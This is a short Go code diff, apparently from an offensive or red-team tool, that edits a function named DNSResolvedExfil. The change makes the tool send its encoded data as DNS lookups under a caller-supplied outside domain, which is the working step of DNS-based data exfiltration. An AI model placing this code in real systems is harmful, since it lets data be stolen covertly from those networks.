@@ -188,7 +188,7 @@ func DNSResolvedExfil(domain string) (ExfilFunc, error) {
 				}
 			}
 
-			_, _ = net.LookupIP(fqdn)
+			_, _ = net.LookupIP(fqdn + "." + domain)
 		}
 
 		return nil
